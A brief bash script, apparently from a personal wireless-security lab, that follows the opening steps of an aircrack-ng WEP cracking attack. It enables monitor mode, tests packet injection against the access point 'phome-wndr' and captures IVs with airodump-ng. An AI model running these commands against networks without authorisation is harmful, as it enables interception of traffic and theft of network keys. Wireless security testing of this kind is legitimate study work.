#!/bin/bash

#Step 1 - Start the wireless interface in monitor mode on AP channel
    airmon-ng start wlp2s0
    iwconfig wlp2s0mon freq 2.422G

#Step 2 - Test Wireless Device Packet Injection
    aireplay-ng -9 -e phome-wndr -a 6C:B0:CE:17:AD:71 wlp2s0mon

#Step 3 - Start airodump-ng to capture the IVs
    airodump-ng -c 3 --bssid 6C:B0:CE:17:AD:71 -w sharedkey wlp2s0mon
